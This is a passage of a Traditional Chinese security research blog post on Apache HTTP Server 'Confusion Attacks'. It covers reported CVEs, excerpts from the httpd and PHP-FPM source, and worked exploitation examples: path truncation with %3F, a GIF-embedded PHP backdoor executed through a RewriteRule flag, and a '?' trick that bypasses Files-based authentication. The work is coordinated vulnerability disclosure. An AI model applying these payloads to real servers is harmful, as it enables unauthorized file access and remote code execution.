---
source: orange-tsai
source_url: https://blog.orange.tw/posts/2024-08-confusion-attacks-ch/
title: "(繁中) Confusion Attacks: Exploiting Hidden Semantic Ambiguity in Apache HTTP Server! | Orange Tsai"
author: "Orange Tsai"
published: 2024-08-08T16:00:00.000Z
description: "📌 [ 繁體中文 | English ] 嗨，這是我今年發表在 Black Hat USA 2024 上針對 Apache HTTP Server 的研究。 此外，這份研究也將在 HITCON 和 OrangeCon 上發表，有興趣搶先了解可點此取得投影片： Confusion Attacks: Exploiting Hidden Semantic Ambiguity in Apache"
---

* * *

📌 \[ [繁體中文](https://blog.orange.tw/2024/08/confusion-attacks-ch.html) \| [English](https://blog.orange.tw/2024/08/confusion-attacks-en.html) \]

![preview](https://blog.orange.tw/posts/2024-08-confusion-attacks-ch/68a9e5dd90df580b-01.png)

嗨，這是我今年發表在 [Black Hat USA 2024](https://www.blackhat.com/us-24/briefings/schedule/index.html#confusion-attacks-exploiting-hidden-semantic-ambiguity-in-apache-http-server-pre-recorded-40227) 上針對 Apache HTTP Server 的研究。 此外，這份研究也將在 [HITCON](https://hitcon.org/2024/CMT/agenda/eff94e55-3f1d-4229-a65a-65ade9524421/) 和 [OrangeCon](https://orangecon.nl/) 上發表，有興趣搶先了解可點此取得投影片：

> [Confusion Attacks: Exploiting Hidden Semantic Ambiguity in Apache HTTP Server!](https://i.blackhat.com/BH-US-24/Presentations/US24-Orange-Confusion-Attacks-Exploiting-Hidden-Semantic-Thursday.pdf)

另外也謝謝來自 Akamai 的友善聯繫！ 此份研究發表後第一時間他們也發佈了緩解措施 (詳情可參考 [Akamai 的部落格](https://www.akamai.com/blog/security-research/2024-august-apache-waf-proactive-collaboration-orange-tsai-devcore))。

# [TL;DR](https://blog.orange.tw/posts/2024-08-confusion-attacks-ch/\#TL-DR "TL;DR") TL;DR

這篇文章探索了 Apache HTTP Server 中存在的架構問題，介紹了數個 Httpd 的架構債， **包含 3 種不同的 Confusion Attacks、9 個新漏洞、20 種利用手法以及超過 30 種案例分析**。 包括但不限於：

1. 怎麼使用一個 `?` 繞過 Httpd 內建的存取控制以及認證。
2. 不安全的 `RewriteRule` 怎麼跳脫 Web Root 並存取整個檔案系統。
3. 如何利用一段從 1996 遺留至今的程式碼把一個 XSS 轉化成 RCE。

# [大綱](https://blog.orange.tw/posts/2024-08-confusion-attacks-ch/\#%E5%A4%A7%E7%B6%B1 "大綱") 大綱

- [在故事之前](https://blog.orange.tw/posts/2024-08-confusion-attacks-ch/#%E5%9C%A8%E6%95%85%E4%BA%8B%E4%B9%8B%E5%89%8D)
- [故事是如何開始的？](https://blog.orange.tw/posts/2024-08-confusion-attacks-ch/#%E6%95%85%E4%BA%8B%E6%98%AF%E5%A6%82%E4%BD%95%E9%96%8B%E5%A7%8B%E7%9A%84%EF%BC%9F)
- [為什麼 Apache HTTP Server 聞起來臭臭的？](https://blog.orange.tw/posts/2024-08-confusion-attacks-ch/#%E7%82%BA%E4%BB%80%E9%BA%BC-Apache-HTTP-Server-%E8%81%9E%E8%B5%B7%E4%BE%86%E8%87%AD%E8%87%AD%E7%9A%84%EF%BC%9F)
- [關於這次的新攻擊面： Confusion Attacks](https://blog.orange.tw/posts/2024-08-confusion-attacks-ch/#%E9%97%9C%E6%96%BC%E9%80%99%E6%AC%A1%E7%9A%84%E6%96%B0%E6%94%BB%E6%93%8A%E9%9D%A2%EF%BC%9A-Confusion-Attacks)
  - [1\. Filename Confusion](https://blog.orange.tw/posts/2024-08-confusion-attacks-ch/#%F0%9F%94%A5-1-Filename-Confusion)
    - [Primitive 1-1. Truncation](https://blog.orange.tw/posts/2024-08-confusion-attacks-ch/#%E2%9A%94%EF%B8%8F-Primitive-1-1-Truncation)
      - [1-1-1. Path Truncation](https://blog.orange.tw/posts/2024-08-confusion-attacks-ch/#%E2%9C%94%EF%B8%8F-1-1-1-Path-Truncation)
      - [1-1-2. Mislead RewriteFlag Assignment](https://blog.orange.tw/posts/2024-08-confusion-attacks-ch/#%E2%9C%94%EF%B8%8F-1-1-2-Mislead-RewriteFlag-Assignment)
    - [Primitive 1-2. ACL Bypass](https://blog.orange.tw/posts/2024-08-confusion-attacks-ch/#%E2%9A%94%EF%B8%8F-Primitive-1-2-ACL-Bypass)
  - [2\. DocumentRoot Confusion](https://blog.orange.tw/posts/2024-08-confusion-attacks-ch/#%F0%9F%94%A5-2-DocumentRoot-Confusion)
    - [Primitive 2-1. Server-Side Source Code Disclosure](https://blog.orange.tw/posts/2024-08-confusion-attacks-ch/#%E2%9A%94%EF%B8%8F-Primitive-2-1-Server-Side-Source-Code-Disclosure)
      - [2-1-1. Disclose CGI Source Code](https://blog.orange.tw/posts/2024-08-confusion-attacks-ch/#%E2%9C%94%EF%B8%8F-2-1-1-Disclose-CGI-Source-Code)
      - [2-1-2. Disclose PHP Source Code](https://blog.orange.tw/posts/2024-08-confusion-attacks-ch/#%E2%9C%94%EF%B8%8F-2-1-2-Disclose-PHP-Source-Code)
    - [Primitive 2-2. Local Gadgets Manipulation!](https://blog.orange.tw/posts/2024-08-confusion-attacks-ch/#%E2%9A%94%EF%B8%8F-Primitive-2-2-Local-Gadgets-Manipulation)
      - [2-2-1. Local Gadget to Information Disclosure](https://blog.orange.tw/posts/2024-08-confusion-attacks-ch/#%E2%9C%94%EF%B8%8F-2-2-1-Local-Gadget-to-Information-Disclosure)
      - [2-2-2. Local Gadget to XSS](https://blog.orange.tw/posts/2024-08-confusion-attacks-ch/#%E2%9C%94%EF%B8%8F-2-2-2-Local-Gadget-to-XSS)
      - [2-2-3. Local Gadget to LFI](https://blog.orange.tw/posts/2024-08-confusion-attacks-ch/#%E2%9C%94%EF%B8%8F-2-2-3-Local-Gadget-to-LFI)
      - [2-2-4. Local Gadget to SSRF](https://blog.orange.tw/posts/2024-08-confusion-attacks-ch/#%E2%9C%94%EF%B8%8F-2-2-4-Local-Gadget-to-SSRF)
      - [2-2-5. Local Gadget to RCE](https://blog.orange.tw/posts/2024-08-confusion-attacks-ch/#%E2%9C%94%EF%B8%8F-2-2-5-Local-Gadget-to-RCE)
    - [Primitive 2-3. Jailbreak from Local Gadgets](https://blog.orange.tw/posts/2024-08-confusion-attacks-ch/#%E2%9A%94%EF%B8%8F-Primitive-2-3-Jailbreak-from-Local-Gadgets)
      - [2-3-1. Jailbreak from Local Gadgets](https://blog.orange.tw/posts/2024-08-confusion-attacks-ch/#%E2%9C%94%EF%B8%8F-2-3-1-Jailbreak-from-Local-Gadgets)
      - [2-3-2. Jailbreak Local Gadgets to Redmine RCE](https://blog.orange.tw/posts/2024-08-confusion-attacks-ch/#%E2%9C%94%EF%B8%8F-2-3-2-Jailbreak-Local-Gadgets-to-Redmine-RCE)
  - [3\. Handler Confusion](https://blog.orange.tw/posts/2024-08-confusion-attacks-ch/#%F0%9F%94%A5-3-Handler-Confusion)
    - [Primitive 3-1. Overwrite the Handler](https://blog.orange.tw/posts/2024-08-confusion-attacks-ch/#%E2%9A%94%EF%B8%8F-Primitive-3-1-Overwrite-the-Handler)
      - [3-1-1. Overwrite Handler to Disclose PHP Source Code](https://blog.orange.tw/posts/2024-08-confusion-attacks-ch/#%E2%9C%94%EF%B8%8F-3-1-1-Overwrite-Handler-to-Disclose-PHP-Source-Code)
      - [3-1-2. Overwrite Handler to ██████ ███████ ██████](https://blog.orange.tw/posts/2024-08-confusion-attacks-ch/#%E2%9C%94%EF%B8%8F-3-1-2-Overwrite-Handler-to-%E2%96%88%E2%96%88%E2%96%88%E2%96%88%E2%96%88%E2%96%88-%E2%96%88%E2%96%88%E2%96%88%E2%96%88%E2%96%88%E2%96%88%E2%96%88-%E2%96%88%E2%96%88%E2%96%88%E2%96%88%E2%96%88%E2%96%88)
    - [Primitive 3-2. Invoke Arbitrary Handlers](https://blog.orange.tw/posts/2024-08-confusion-attacks-ch/#%E2%9A%94%EF%B8%8F-Primitive-3-2-Invoke-Arbitrary-Handlers)
      - [3-2-1. Arbitrary Handler to Information Disclosure](https://blog.orange.tw/posts/2024-08-confusion-attacks-ch/#%E2%9C%94%EF%B8%8F-3-2-1-Arbitrary-Handler-to-Information-Disclosure)
      - [3-2-2. Arbitrary Handler to Misinterpret Scripts](https://blog.orange.tw/posts/2024-08-confusion-attacks-ch/#%E2%9C%94%EF%B8%8F-3-2-2-Arbitrary-Handler-to-Misinterpret-Scripts)
      - [3-2-2. Arbitrary Handler to Full SSRF](https://blog.orange.tw/posts/2024-08-confusion-attacks-ch/#%E2%9C%94%EF%B8%8F-3-2-2-Arbitrary-Handler-to-Full-SSRF)
      - [3-2-3. Arbitrary Handler to Access Local Unix Domain Socket](https://blog.orange.tw/posts/2024-08-confusion-attacks-ch/#%E2%9C%94%EF%B8%8F-3-2-3-Arbitrary-Handler-to-Access-Local-Unix-Domain-Socket)
      - [3-2-4. Arbitrary Handler to RCE](https://blog.orange.tw/posts/2024-08-confusion-attacks-ch/#%E2%9C%94%EF%B8%8F-3-2-4-Arbitrary-Handler-to-RCE)
  - [4\. 其它漏洞](https://blog.orange.tw/posts/2024-08-confusion-attacks-ch/#%F0%9F%94%A5-4-%E5%85%B6%E5%AE%83%E6%BC%8F%E6%B4%9E)
    - [CVE-2024-38472 - 基於 Windows UNC 的 SSRF](https://blog.orange.tw/posts/2024-08-confusion-attacks-ch/#%E2%9A%94%EF%B8%8F-CVE-2024-38472---%E5%9F%BA%E6%96%BC-Windows-UNC-%E7%9A%84-SSRF)
      - [透過 HTTP 請求解析器觸發](https://blog.orange.tw/posts/2024-08-confusion-attacks-ch/#%E2%9C%94%EF%B8%8F-%E9%80%8F%E9%81%8E-HTTP-%E8%AB%8B%E6%B1%82%E8%A7%A3%E6%9E%90%E5%99%A8%E8%A7%B8%E7%99%BC)
      - [透過 Type-Map 觸發](https://blog.orange.tw/posts/2024-08-confusion-attacks-ch/#%E2%9C%94%EF%B8%8F-%E9%80%8F%E9%81%8E-Type-Map-%E8%A7%B8%E7%99%BC)
    - [CVE-2024-39573 - 基於 RewriteRule 前綴可完全控制的 SSRF](https://blog.orange.tw/posts/2024-08-confusion-attacks-ch/#%E2%9A%94%EF%B8%8F-CVE-2024-39573---%E5%9F%BA%E6%96%BC-RewriteRule-%E5%89%8D%E7%B6%B4%E5%8F%AF%E5%AE%8C%E5%85%A8%E6%8E%A7%E5%88%B6%E7%9A%84-SSRF)
- [未來研究方向](https://blog.orange.tw/posts/2024-08-confusion-attacks-ch/#%E6%9C%AA%E4%BE%86%E7%A0%94%E7%A9%B6%E6%96%B9%E5%90%91)
- [結語](https://blog.orange.tw/posts/2024-08-confusion-attacks-ch/#%E7%B5%90%E8%AA%9E)

# [在故事之前](https://blog.orange.tw/posts/2024-08-confusion-attacks-ch/\#%E5%9C%A8%E6%95%85%E4%BA%8B%E4%B9%8B%E5%89%8D "在故事之前") 在故事之前

這裡純粹是一些個人的 Murmur，如果只對技術細節感興趣可以直接跳到 —— [故事是如何開始的？](https://blog.orange.tw/posts/2024-08-confusion-attacks-ch/#%E6%95%85%E4%BA%8B%E6%98%AF%E5%A6%82%E4%BD%95%E9%96%8B%E5%A7%8B%E7%9A%84%EF%BC%9F)

身為一名研究員、最大的快樂應該就是當自己的作品被同行關注並理解。所以當完成一個作品並擁有豐碩的成果後，理所當然會想要讓它被世界看到 —— 這也是為什麼我會多次在 Black Hat USA 以及 DEFCON 上分享的緣故。 在讀這篇文章的你也許知道，我從 2022 後就拿不到一個合法的簽證進入美國 (在 [免簽計畫](https://esta.cbp.dhs.gov/) 中的台灣，通常只需要線上申請，數分鐘到數小時內就能取得旅行授權)，導致錯過 [Black Hat USA 2022](https://www.blackhat.com/us-22/briefings/schedule/index.html#lets-dance-in-the-cache---destabilizing-hash-table-on-microsoft-iis-27199) 的實體演講。甚至 2023 到秘魯還有復活節島獨旅也無法從美國轉機 :(

為了解決這個情況，我從今年一月就開始準備 B1/B2 簽證、撰寫各式文件、到大使館面試以及漫無止盡的等待，這不是一件好玩的事，但為了讓作品被看到，還是花了非常多的時間在為了簽證奔波，以及尋求各種可能，甚至到會議開始的前三個禮拜，還不清楚發表是否會被取消 (BH 一開始只接受現場演講，不過謝謝審稿委員對這份研究的認可最終還是能透過預錄的形式發表)，所以你所看到的所有內容包含投影片、錄影以及部落格文字都是在短短數十天內完成的。 😖

我只是一個單純的研究員，自認問心無愧，對漏洞的態度也始終是 —— 漏洞就該讓它被廠商知道以及修復。 寫這些文字也不為了什麼，純粹紀錄下一些無奈的心情、今年所做過的努力，以及謝謝在這個過程中幫助過我的人，謝謝你們 :)

# [故事是如何開始的？](https://blog.orange.tw/posts/2024-08-confusion-attacks-ch/\#%E6%95%85%E4%BA%8B%E6%98%AF%E5%A6%82%E4%BD%95%E9%96%8B%E5%A7%8B%E7%9A%84%EF%BC%9F "故事是如何開始的？") 故事是如何開始的？

大概是在今年年初的時候，我開始思考下一個研究的目標，也許你知道我總是希望挑戰那些影響整個網際網路的大目標，所以開始尋找一些看似複雜的主題或有趣的開源專案，例如 Nginx、PHP、甚至開始看起 RFC 來強化自己對於協議實作細節的認知。

雖然大部分的嘗試都以失敗告終 (不過有些也許會變成下一篇部落格主題 😉)，但在細細品嘗這些程式碼時，我回憶起了曾經在去年年中短暫看過 Apache HTTP Server 原始碼這件事！ 儘管最終由於工作的時程規畫並無深入的閱讀程式碼，但在那時就已經從它的編碼風格上「聞」到了一些不太好的味道。

於是在今年決定繼續下去，把「為什麼聞起來怪怪的」這件事從原本只是一個說不出的「感覺」具象化，深入下去研究 Apache HTTP Server！

# [為什麼 Apache HTTP Server 聞起來臭臭的？](https://blog.orange.tw/posts/2024-08-confusion-attacks-ch/\#%E7%82%BA%E4%BB%80%E9%BA%BC-Apache-HTTP-Server-%E8%81%9E%E8%B5%B7%E4%BE%86%E8%87%AD%E8%87%AD%E7%9A%84%EF%BC%9F "為什麼 Apache HTTP Server 聞起來臭臭的？") 為什麼 Apache HTTP Server 聞起來臭臭的？

首先，Apache HTTP Server 是一個由「模組們」建構起來的世界，從它 [官方文件](https://httpd.apache.org/docs/2.4/mpm.html) 中也看到其對於自身模組化 (MPMs - Multi-Processing Modules) 的自豪：

> Apache httpd has always accommodated a wide variety of environments through its modular design. \[…\] Apache HTTP Server 2.0 extends this modular design to the most basic functions of a web server.

整個 Httpd 的服務需要由數百個小模組齊心合力，共同合作才能完成客戶端的 HTTP 請求， [官方所列出的 136 個模組](https://httpd.apache.org/docs/2.4/mod/) **其中約有快一半是預設啟用或經常被使用的模組**！

而更令人驚訝的是，這麼多模組在處理客戶端 HTTP 請求的時候，彼此之間還要共同維護著一份非常巨大的 `request_rec` 結構。 這個結構包括了在處理 HTTP 時會用到的一切元素，詳細的定義可以從 [include/httpd.h](https://github.com/apache/httpd/blob/2.4.58/include/httpd.h#L838) 中找到。 所有模組都依賴這個巨大的結構去同步、溝通，甚至交換資料。 這個內部結構會像是拋接球般在所有模組間傳遞來傳遞去，每個模組都可以根據自己的喜好去隨意修改這個結構上的任意值！

![](https://blog.orange.tw/posts/2024-08-confusion-attacks-ch/016234389a51f40b-02.png)

這樣子的合作方式從軟體工程的角度來說其實不是什麼新鮮事，個體只需專心把份內事完成，只要所有人都乖乖完成自己的工作，那客戶就可以正常享受 Httpd 所提供的服務。 這樣子的分工在數個模組內可能還沒什麼問題， **但如果今天把規模放大到數百個模組間的協同合作 —— 它們真的有辦法好好合作嗎？** 🤔

所以我們的出發點很簡單 —— **模組間其實並不完全了解彼此的實作細節，但卻又被要求要一起合作**。 每個模組可能由不同的開發者實作，程式碼歷經多年的疊代、重整以及修改，它們真的還清楚自己在做什麼嗎？ 就算對自己瞭若指掌，那對其它模組呢？ 在缺乏一個好的開發標準或使用準則下，這中間必然會存在很多小縫隙是我們可以利用的！

# [關於這次的新攻擊面： Confusion Attacks](https://blog.orange.tw/posts/2024-08-confusion-attacks-ch/\#%E9%97%9C%E6%96%BC%E9%80%99%E6%AC%A1%E7%9A%84%E6%96%B0%E6%94%BB%E6%93%8A%E9%9D%A2%EF%BC%9A-Confusion-Attacks "關於這次的新攻擊面： Confusion Attacks") 關於這次的新攻擊面： Confusion Attacks

基於前面的思考，我們開始專注在 **研究這些模組間的「關係」以及「交互作用」**。 如果有一個模組不小心修改到了它覺得不重要但對另一個模組至關重要的結構欄位，那可能就會影響該模組的判斷。 甚至更進一步，如果 Apache HTTP Server 對這些結構的定義不夠精確，導致不同模組對同一個欄位在理解上有著根本的不一致，這都可能產生安全上的風險！

從這個出發點我們發展出了三種不同的攻擊，由於這些攻擊或多或少都模組對於結構欄位的誤用有關，因此把這個攻擊面命名為「Confusion Attack」，而以下是我們所發展出的攻擊：

1. **Filename Confusion**
2. **DocumentRoot Confusion**
3. **Handler Confusion**

從這些攻擊出發我們找到了 9 個不同的漏洞：

1. **CVE-2024-38472** \- Apache HTTP Server on Windows UNC SSRF
2. **CVE-2024-39573** \- Apache HTTP Server proxy encoding problem
3. **CVE-2024-38477** \- Apache HTTP Server: Crash resulting in Denial of Service in mod\_proxy via a malicious request
4. **CVE-2024-38476** \- Apache HTTP Server may use exploitable/malicious backend application output to run local handlers via internal redirect
5. **CVE-2024-38475** \- Apache HTTP Server weakness in mod\_rewrite when first segment of substitution matches filesystem path
6. **CVE-2024-38474** \- Apache HTTP Server weakness with encoded question marks in backreferences
7. **CVE-2024-38473** \- Apache HTTP Server proxy encoding problem
8. **CVE-2023-38709** \- Apache HTTP Server: HTTP response splitting
9. **CVE-2024-??????** \- \[redacted\]

這些漏洞都透過官方的安全信箱回報，並由 Apache HTTP Server 團隊在 2024-07-01 發佈安全性通報以及 2.4.60 更新 (詳細可參考 [官方公告](https://httpd.apache.org/security/vulnerabilities_24.html))。

由於這是一個針對 Httpd 架構以及其內部機制所帶來的新攻擊面， ~~理所當然第一個參與的人可以找到最多漏洞，因此我也是目前擁有最多 Apache HTTP Server CVE 的人 😉~~，導致很多更新修復由於其歷史架構無法向下兼容。 所以對於很多運行許久的正式伺服器來說修復並不是一件容易的事，若網站管理員不經思考就直接更新反而會打破許多舊有的設定造成服務中斷。 😨

接下來就開始介紹這次發展出來的攻擊們吧！

## [🔥 1. Filename Confusion](https://blog.orange.tw/posts/2024-08-confusion-attacks-ch/\#%F0%9F%94%A5-1-Filename-Confusion "🔥 1. Filename Confusion") 🔥 1\. Filename Confusion

首先，第一個是基於 Filename 欄位上的 Confusion，從字面上來看 `r->filename` 應該是一個檔案系統路徑，然而在 Httpd 中，有些模組會把它當成網址來處理。 如果在 HTTP 請求的上下文中，有些模組把 `r->filename` 當成檔案路徑，而其他模組將它當成網址，這其中的不一致就會造成安全上的問題！

### [⚔️ Primitive 1-1. Truncation](https://blog.orange.tw/posts/2024-08-confusion-attacks-ch/\#%E2%9A%94%EF%B8%8F-Primitive-1-1-Truncation "⚔️ Primitive 1-1. Truncation") ⚔️ Primitive 1-1. Truncation

所以哪些模組會把 `r->filename` 當成網址呢？ 首先是 `mod_rewrite` 允許網站管理員透過 `RewriteRule` 語法輕鬆的將路徑透過指定的規則改寫：

|     |     |
| --- | --- |
| ```<br>1<br>``` | ```<br>RewriteRule Pattern Substitution [flags]<br>``` |

其中目標可以是一個檔案系統路徑或是一個網址，我想這應該是一個為了使用者體驗所做出的方便，但同時這個「方便」也帶出了一些風險，例如 **在改寫路徑時，`mod_rewrite` 會強制把結果視為網址處理 (`splitout_queryargs()`)**，這導致了在 HTTP 請求中可以透過一個問號 `%3F` 去截斷 `RewriteRule` 後面的路徑或網址，並引出以下兩種攻擊手法。

_**Path: [modules/mappers/mod\_rewrite.c#L4141](https://github.com/apache/httpd/blob/2.4.58/modules/mappers/mod_rewrite.c#L4141)**_

|     |     |
| --- | --- |
| ```<br>1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10<br>11<br>12<br>13<br>14<br>15<br>16<br>17<br>18<br>19<br>20<br>21<br>22<br>23<br>24<br>25<br>26<br>27<br>28<br>29<br>30<br>``` | ```<br>/*<br> * Apply a single RewriteRule<br> */<br>static int apply_rewrite_rule(rewriterule_entry *p, rewrite_ctx *ctx)<br>{<br>    ap_regmatch_t regmatch[AP_MAX_REG_MATCH];<br>    apr_array_header_t *rewriteconds;<br>    rewritecond_entry *conds;<br>    <br>    // [...]<br>    <br>    for (i = 0; i < rewriteconds->nelts; ++i) {<br>        rewritecond_entry *c = &conds[i];<br>        rc = apply_rewrite_cond(c, ctx);<br>        <br>        // [...] do the remaining stuff<br>        <br>    }<br>    <br>    /* Now adjust API's knowledge about r->filename and r->args */<br>    r->filename = newuri;<br>    if (ctx->perdir && (p->flags & RULEFLAG_DISCARDPATHINFO)) {<br>        r->path_info = NULL;<br>    }<br>    splitout_queryargs(r, p->flags);         // <------- [!!!] Truncate the `r->filename`<br>    <br>    // [...]<br>}<br>``` |

#### [✔️ 1-1-1. Path Truncation](https://blog.orange.tw/posts/2024-08-confusion-attacks-ch/\#%E2%9C%94%EF%B8%8F-1-1-1-Path-Truncation "✔️ 1-1-1. Path Truncation") ✔️ 1-1-1. Path Truncation

首先，第一個攻擊手法是檔案系統路徑上的截斷，想像下面這個 `RewriteRule`：

|     |     |
| --- | --- |
| ```<br>1<br>2<br>``` | ```<br>RewriteEngine On<br>RewriteRule "^/user/(.+)$" "/var/user/$1/profile.yml"<br>``` |

伺服器會根據網址路徑 `/user/` 後的使用者名稱開啟相對應的個人設定檔案，例如：

|     |     |
| --- | --- |
| ```<br>1<br>2<br>``` | ```<br>$ curl http://server/user/orange<br> # the output of file `/var/user/orange/profile.yml`<br>``` |

由於 `mod_rewrite` 會強制將重寫後的結果當成一個網址處理，因此雖然目標是一個檔案系統路徑，但卻可以透過一個問號去截斷後方的 `/profile.yml` 例如：

|     |     |
| --- | --- |
| ```<br>1<br>2<br>``` | ```<br>$ curl http://server/user/orange%2Fsecret.yml%3F<br> # the output of file `/var/user/orange/secret.yml`<br>``` |

這是我們的第一個攻擊手法 —— 路徑截斷。 對於這個攻擊手法的探索先稍稍停留在這邊，雖然目前看起來還只是一個小瑕疵，但請先記好它，因為這會在之後的攻擊中一再的出現，慢慢把這個看似無用的小破口撕裂開來！ 😜

#### [✔️ 1-1-2. Mislead RewriteFlag Assignment](https://blog.orange.tw/posts/2024-08-confusion-attacks-ch/\#%E2%9C%94%EF%B8%8F-1-1-2-Mislead-RewriteFlag-Assignment "✔️ 1-1-2. Mislead RewriteFlag Assignment") ✔️ 1-1-2. Mislead RewriteFlag Assignment

截斷手法的第二個利用是誤導 `RewriteFlag` 的設置，想像網站管理員透過下列的 `RewriteRule` 去管理網站中路徑以及相對應模組：

|     |     |
| --- | --- |
| ```<br>1<br>2<br>``` | ```<br>RewriteEngine On<br>RewriteRule  ^(.+\.php)$  $1  [H=application/x-httpd-php]<br>``` |

如果請求附檔名是 `.php` 結尾則加上 `mod_php` 相對應的處理器 (此外也可以是環境變數或是 `Content-Type`，關於標誌的詳細設定可參考官方的手冊 [RewriteRule Flags](https://httpd.apache.org/docs/2.4/rewrite/flags.html))。

由於 `mod_rewrite` 的截斷行為發生在正規表達式匹配後，因此惡意的攻擊者可以利用原本的規則，透過 `?` 將 `RewriteFlag` 設定到不屬於它們的請求上。 例如上傳一個夾帶惡意 PHP 程式碼的 GIF 圖片並透過惡意請求將圖片當成後門執行：

|     |     |
| --- | --- |
| ```<br>1<br>2<br>3<br>4<br>5<br>``` | ```<br>$ curl http://server/upload/1.gif<br> # GIF89a <?=`id`;><br>$ curl http://server/upload/1.gif%3fooo.php<br> # GIF89a uid=33(www-data) gid=33(www-data) groups=33(www-data)<br>``` |

### [⚔️ Primitive 1-2. ACL Bypass](https://blog.orange.tw/posts/2024-08-confusion-attacks-ch/\#%E2%9A%94%EF%B8%8F-Primitive-1-2-ACL-Bypass "⚔️ Primitive 1-2. ACL Bypass") ⚔️ Primitive 1-2. ACL Bypass

Filename Confusion 的第二個攻擊手法發生在 `mod_proxy` 身上，相較前一個攻擊是無條件將目標當成網址處理，這次則是 **因為模組間對 `r->filename` 的理解不一致所導致的認證及存取控制繞過**！

`mod_proxy` 會將 `r->filename` 當成網址這件事情其實很合理，因為原本 Proxy 的目的就是將請求「導向」到其它網址上，但安全往往就是單獨拿出來看沒問題，搭配在一起就出問題了！ 特別是當大多數模組預設將 `r->filename` 視為檔案系統路徑時，試想一下假設今天你使用基於檔案系統的存取控制模組，而現在 `mod_proxy` 又會把 `r->filename` 當成網址，這其中的不一致就可以導致存取控制或是認證被繞過！

一個經典的例子是，網站管理員透過 `Files` 語法去對單一檔案加上限制，例如 `admin.php`：

|     |     |
| --- | --- |
| ```<br>1<br>2<br>3<br>4<br>5<br>6<br>``` | ```<br><Files "admin.php"><br>    AuthType Basic <br>    AuthName "Admin Panel"<br>    AuthUserFile "/etc/apache2/.htpasswd"<br>    Require valid-user<br></Files><br>``` |

在預設安裝的 PHP-FPM 環境中，這種設定可以被直接繞過！ 順道一提這也是 Apache HTTP Server 中最常見到的認證方式！ 假設今天你瀏覽了這樣的網址：

> http://server/admin.php%3Fooo.php

首先在這個網址的 HTTP 生命週期中，認證模組會將請求的檔案名稱與被保護的檔案進行比對，此時 `r->filename` 欄位是 `admin.php?ooo.php` 理所當然與 `admin.php` 不符合，於是模組會認為當前請求不需要認證。 然而 PHP-FPM 的設定檔案又設定當收到結尾為 `.php` 的請求時透過 `SetHandler` 語法將請求轉交給 `mod_proxy`：

_**Path: /etc/apache2/mods-enabled/php8.2-fpm.conf**_

|     |     |
| --- | --- |
| ```<br>1<br>2<br>3<br>4<br>5<br>``` | ```<br># Using (?:pattern) instead of (pattern) is a small optimization that<br># avoid capturing the matching pattern (as $1) which isn't used here<br><FilesMatch ".+\.ph(?:ar|p|tml)$"><br>    SetHandler "proxy:unix:/run/php/php8.2-fpm.sock|fcgi://localhost"<br></FilesMatch><br>``` |

`mod_proxy` 會將 `r->filename` 重寫成以下網址並根據其中的協議呼叫子模組 `mod_proxy_fcgi` 處理後續 FastCGI 協議的邏輯：

> proxy:fcgi://127.0.0.1:9000/var/www/html/admin.php?ooo.php

由於這時後端在收到檔案名稱時已經是一個奇怪的格式了，PHP-FPM 只好對這個行為做特別處理，其中處理的邏輯如下：

_**Path: [sapi/fpm/fpm/fpm\_main.c#L1044](https://github.com/php/php-src/blob/ce51bfac759dedac1537f4d5666dcd33fbc4a281/sapi/fpm/fpm/fpm_main.c#L1044)**_

|     |     |
| --- | --- |
| ```<br>1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10<br>11<br>12<br>13<br>14<br>15<br>16<br>17<br>18<br>19<br>20<br>21<br>22<br>23<br>``` | ```<br>#define APACHE_PROXY_FCGI_PREFIX "proxy:fcgi://"<br>#define APACHE_PROXY_BALANCER_PREFIX "proxy:balancer://"<br>if (env_script_filename &&<br>    strncasecmp(env_script_filename, APACHE_PROXY_FCGI_PREFIX, sizeof(APACHE_PROXY_FCGI_PREFIX) - 1) == 0) {<br>    /* advance to first character of hostname */<br>    char *p = env_script_filename + (sizeof(APACHE_PROXY_FCGI_PREFIX) - 1);<br>    while (*p != '\0' && *p != '/') {<br>        p++;    /* move past hostname and port */<br>    }<br>    if (*p != '\0') {<br>        /* Copy path portion in place to avoid memory leak.  Note<br>         * that this also affects what script_path_translated points<br>         * to. */<br>        memmove(env_script_filename, p, strlen(p) + 1);<br>        apache_was_here = 1;<br>    }<br>    /* ignore query string if sent by Apache (RewriteRule) */<br>    p = strchr(env_script_filename, '?');<br>    if (p) {<br>        *p =0;<br>    }<br>}<br>``` |

可以看到 PHP-FPM 先對檔案名稱正規化並對其中的問號 `?` 進行分隔取出其中實際的檔案路徑並執行 (也就是 `/var/www/html/admin.php`)。 所以基本上 **所有使用 `Files` 語法針對單一 PHP 檔案的認證或是存取控制設定在運行 PHP-FPM 的情境下都存在風險！** 😮

從 GitHub 上可以找到非常多潛在有風險的設定，例如被限制在只有內網才能存取的 `phpinfo()`：

|     |     |
| --- | --- |
| ```<br>1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>``` | ```<br># protect phpinfo, only allow localhost and local network access<br><Files php-info.php><br>    # LOCAL ACCESS ONLY<br>    # Require local <br>    # LOCAL AND LAN ACCESS<br>    Require ip 10 172 192.168<br></Files><br>``` |

使用 `.htaccess` 阻擋起來的 Adminer：

|     |     |
| --- | --- |
| ```<br>1<br>2<br>3<br>4<br>``` | ```<br><Files adminer.php><br>    Order Allow,Deny<br>    Deny from all<br></Files><br>``` |

被保護起來的 `xmlrpc.php`：

|     |     |
| --- | --- |
| ```<br>1<br>2<br>3<br>4<br>``` | ```<br><Files xmlrpc.php><br>    Order Allow,Deny<br>    Deny from all<br></Files><br>``` |

防止直接存取的命令行工具：

|     |     |
| --- | --- |
| ```<br>1<br>2<br>3<br>``` | ```<br><Files "cron.php"><br>    Deny from all<br></Files><br>``` |

透過認證模組以及 `mod_proxy` 間對 `r->filename` 欄位理解的不一致，上面所有的例子都可以透過一個 `?` 成功繞過！

## [🔥 2. DocumentRoot Confusion](https://blog.orange.tw/posts/2024-08-confusion-attacks-ch/\#%F0%9F%94%A5-2-DocumentRoot-Confusion "🔥 2. DocumentRoot Confusion") 🔥 2\. DocumentRoot Confusion

接下來要介紹的攻擊是基於 DocumentRoot 上的 Confusion Attack！ 首先你可以思考一下，對於下面這樣子的 Httpd 設定：

|     |     |
| --- | --- |
| ```<br>1<br>2<br>``` | ```<br>DocumentRoot /var/www/html<br>RewriteRule  ^/html/(.*)$   /$1.html<br>``` |

當瀏覽 `http://server/html/about` 時，到底實際 Httpd 會開啟哪個檔案？ 是根目錄下的 `/about.html` 還是 DocumentRoot 下的 `/var/www/html/about.html` 呢？

![](https://blog.orange.tw/posts/2024-08-confusion-attacks-ch/cb68682cbd04105d-03.png)

